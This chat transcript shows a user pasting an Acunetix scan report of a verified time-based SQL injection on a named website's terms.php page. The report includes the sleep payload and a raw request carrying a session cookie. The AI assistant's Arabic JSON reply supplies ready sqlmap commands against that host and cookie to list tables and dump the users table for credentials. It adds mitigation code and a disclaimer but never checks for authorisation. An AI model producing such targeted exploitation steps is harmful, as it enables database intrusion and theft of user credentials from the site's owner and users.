### USER
التقرير المستهدف
**Affected Items Report**
Acunetix Security Audit
2021-03-28
Generated by Acunetix
## Target - http://assets.spinlessplates.com/
### Scan details
<table style="min-width: 50px"><colgroup><col style="min-width: 25px"><col style="min-width: 25px"></colgroup><tbody><tr><td colspan="2" rowspan="1"><p>Scan information</p></td></tr><tr><td colspan="1" rowspan="1"><p>Start url</p></td><td colspan="1" rowspan="1"><p>http://assets.spinlessplates.com/sign-up.php</p></td></tr><tr><td colspan="1" rowspan="1"><p>Host</p></td><td colspan="1" rowspan="1"><p>http://assets.spinlessplates.com/</p></td></tr></tbody></table>
#### Threat level
#### Acunetix Threat Level 3
One or more high-severity type vulnerabilities have been discovered by the scanner. A malicious user can exploit these vulnerabilities and compromise the backend database and/or deface your website.
#### Alerts distribution
<table style="min-width: 50px"><colgroup><col style="min-width: 25px"><col style="min-width: 25px"></colgroup><tbody><tr><td colspan="1" rowspan="1"><p>Total alerts found</p></td><td colspan="1" rowspan="1"><p>1</p></td></tr><tr><td colspan="1" rowspan="1"><p>High</p></td><td colspan="1" rowspan="1"><p>1</p></td></tr><tr><td colspan="1" rowspan="1"><p>Medium</p></td><td colspan="1" rowspan="1"><p>0</p></td></tr><tr><td colspan="1" rowspan="1"><p>Low</p></td><td colspan="1" rowspan="1"><p>0</p></td></tr><tr><td colspan="1" rowspan="1"><p>Informational</p></td><td colspan="1" rowspan="1"><p>0</p></td></tr></tbody></table>
### Affected items
<table style="min-width: 50px"><colgroup><col style="min-width: 25px"><col style="min-width: 25px"></colgroup><tbody><tr><td colspan="1" rowspan="1"><p><strong>/terms.php</strong></p></td><td colspan="1" rowspan="1"><p><br></p></td></tr><tr><td colspan="1" rowspan="1"><p><strong>Alert group</strong></p></td><td colspan="1" rowspan="1"><p><strong>SQL injection (verified)</strong></p></td></tr><tr><td colspan="1" rowspan="1"><p>Severity</p></td><td colspan="1" rowspan="1"><p>High</p></td></tr><tr><td colspan="1" rowspan="1"><p>Description</p></td><td colspan="1" rowspan="1"><p>SQL injection (SQLi) refers to an injection attack wherein an attacker can execute malicious SQL statements that control a web application's database server.</p></td></tr><tr><td colspan="1" rowspan="1"><p>Recommendations</p></td><td colspan="1" rowspan="1"><p>Use parameterized queries when dealing with SQL queries that contains user input. Parameterized queries allows the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.</p></td></tr><tr><td colspan="1" rowspan="1"><p>Alert variants</p></td><td colspan="1" rowspan="1"><p><br></p></td></tr><tr><td colspan="1" rowspan="1"><p>Details</p></td><td colspan="1" rowspan="1"><p>URL encoded GET input <strong>signUpId</strong> was set to <strong>if(now()=sysdate(),sleep(6),0)</strong><br><br>Tests performed:</p><ul><li><p>if(now()=sysdate(),sleep(15),0) =&gt; <strong>15.165</strong></p></li><li><p>if(now()=sysdate(),sleep(6),0) =&gt; <strong>6.164</strong></p></li><li><p>if(now()=sysdate(),sleep(0),0) =&gt; <strong>0.164</strong></p></li><li><p>if(now()=sysdate(),sleep(15),0) =&gt; <strong>15.164</strong></p></li><li><p>if(now()=sysdate(),sleep(3),0) =&gt; <strong>3.164</strong></p></li><li><p>if(now()=sysdate(),sleep(0),0) =&gt; <strong>0.163</strong></p></li><li><p>if(now()=sysdate(),sleep(6),0) =&gt; <strong>6.164</strong></p></li></ul><p><br><br>Original value: <strong>1444</strong></p></td></tr><tr><td colspan="2" rowspan="1"><p><code>GET /terms.php?signUpId=if(now()=sysdate()%2Csleep(6)%2C0) HTTP/1.1&nbsp;&nbsp;X-Requested-With: XMLHttpRequest&nbsp;&nbsp;Referer: http://assets.spinlessplates.com/sign-up.php&nbsp;&nbsp;Cookie: PHPSESSID=v9qs0atlpgcbo02d3lmbcjgnc4&nbsp;&nbsp;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&nbsp;&nbsp;Accept-Encoding: gzip,deflate&nbsp;&nbsp;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&nbsp;&nbsp;Host: assets.spinlessplates.com&nbsp;&nbsp;Connection: Keep-alive</code></p></td></tr></tbody></table>
### Scanned items (coverage report)
http://assets.spinlessplates.com/terms.php

### ASSISTANT
```json
{
  "title": "ثغرة SQL Injection الزمنية في نظام تسجيل المستخدمين",
  "vulnerability_analysis": {
    "target_url": "http://assets.spinlessplates.com/terms.php?signUpId=1444",
    "attack_vector": "تم استخدام دالة SLEEP() في معلمة GET (signUpId) مع if(now()=sysdate(),sleep(6),0) لإثبات قابلية الحقن",
    "attack_mechanism": "مثل إرسال ساعة توقيت إلى الخادم بدلاً من رقم تسجيل، حيث يستجيب الخادم بتأخير محدد (6 ثوانٍ) مما يؤكد قابلية تنفيذ أوامر SQL",
    "verification_method": "تم قياس أوقات الاستجابة بدقة:\n- 15.165 ثانية عند sleep(15)\n- 6.164 ثانية عند sleep(6)\n- 0.164 ثانية عند sleep(0)\nمما يثبت العلاقة الخطية بين القيمة المدخلة وزمن الاستجابة",
    "cvss_breakdown": {
      "Base Score": "8.6 (High)",
      "Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
      "Exploitability": "Network-based (AV:N), Low Complexity (AC:L)",
      "Impact": "Confidentiality (High), Integrity (Low), Availability (Low)"
    }
  },
  "exploitation_scenarios": [
    {
      "scenario_title": "استخراج أسماء الجداول عبر Time-Based Blind SQLi",
      "sqlmap_command": "sqlmap -u 'http://assets.spinlessplates.com/terms.php?signUpId=1444' --cookie='PHPSESSID=v9qs0atlpgcbo02d3lmbcjgnc4' --technique=T --time-sec=6 --tamper=space2comment --dbms=mysql --tables",
      "expected_output": "اكتشاف هيكل قاعدة البيانات مع أسماء الجداول مثل (users, admins, transactions) مع تأخير 6 ثوانٍ لكل حرف مستخرج",
      "mitigation": "<?php\n// التحقق من المدخلات الرقمية\n$signUpId = filter_input(INPUT_GET, 'signUpId', FILTER_VALIDATE_INT);\nif ($signUpId === false) {\n    header('HTTP/1.0 400 Bad Request');\n    exit('Invalid input');\n}\n\n// استخدام Prepared Statements\n$stmt = $pdo->prepare('SELECT * FROM terms WHERE id = ?');\n$stmt->execute([$signUpId]);\n?>"
    },
    {
      "scenario_title": "استغلال الثغرة لسرقة بيانات الاعتماد",
      "sqlmap_command": "sqlmap -u 'http://assets.spinlessplates.com/terms.php?signUpId=1444' --cookie='PHPSESSID=v9qs0atlpgcbo02d3lmbcjgnc4' --technique=T --time-sec=6 --dump -T users --columns",
      "expected_output": "استخراج بيانات حساسة مثل (username, password_hash, email) من جدول users مع تأكيد الاختراق عبر تأخير زمني",
      "mitigation": "// تنفيذ إجراءات طارئة:\n1. تغيير جميع كلمات المرور للمستخدمين\n2. تسجيل الخروج من جميع الجلسات النشطة\n3. تدقيق سجلات قاعدة البيانات للاستعلامات المشبوهة"
    }
  ],
  "ethical_guidelines": "تحذير: اختبار الثغرات دون إذن كتابي يعد جريمة وفقاً لقوانين جرائم المعلوماتية في معظم الدول. يقتصر هذا المحتوى على الأغراض التعليمية في بيئات معزولة بترخيص مسبق. يجب تطبيق إصلاحات فورية تشمل:\n1. ترقيع نظام إدارة قواعد البيانات\n2. تدريب المطورين على Secure Coding\n3. تنفيذ Web Application Firewall"
}
```